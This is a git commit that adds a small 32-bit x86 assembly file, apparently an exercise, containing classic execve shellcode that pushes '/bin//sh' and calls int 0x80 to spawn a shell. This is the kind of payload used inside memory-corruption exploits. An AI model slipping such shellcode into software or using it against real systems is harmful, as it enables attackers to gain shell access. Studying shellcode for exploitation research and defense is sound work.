238f836704069dd30506213e466a5d717994948a
vic511 <vic511@hotmail.fr>
2016-05-08 00:19:14 +0200

    Shell stuff

---
+++ 32bits/sh.asm
@@ -0,0 +1,16 @@
+BITS 32
+GLOBAL start
+
+section text
+
+_start:
+	xor 	edx, edx
+	xor 	ecx, ecx
+	xor 	eax, eax
+	push 	eax			; null byte
+	push 	0x68732f2f	; hs//
+	push 	0x6e69622f	; nib/
+	mov 	ebx, esp	
+	mov 	al, 0xb		; execve
+	int 	0x80
+	leave
